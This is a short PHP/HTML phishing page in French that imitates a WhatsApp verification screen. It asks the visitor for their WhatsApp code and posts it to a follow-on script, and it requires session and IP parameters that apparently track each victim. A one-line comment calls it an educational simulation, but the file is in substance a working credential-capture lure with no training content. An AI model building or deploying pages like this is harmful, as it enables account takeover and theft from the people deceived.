<?php
// ⚠️ This is a phishing simulation for educational awareness only.
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';
if (empty($sessionId) || empty($clientIp)) die("Paramètres manquants");
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Vérification WhatsApp</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>body{margin:0;padding:20px;font-family:Segoe UI;background:#f0f2f5}.container{max-width:400px;margin:auto;background:white;padding:20px;border-radius:8px}input{width:100%;padding:10px;border:1px solid #ddd;border-radius:6px}button{background:#00AD5C;color:white;padding:10px 0;border:none;border-radius:6px;width:100%;cursor:pointer}</style>
</head>
<body>
    <div class="container">
        <h2>Vérification WhatsApp</h2>
        <form action="loading.php" method="post">
            <input name="whatsapp_code" placeholder="Code WhatsApp" required>
            <button type="submit">Vérifier</button>
        </form>
    </div>
</body>
</html>
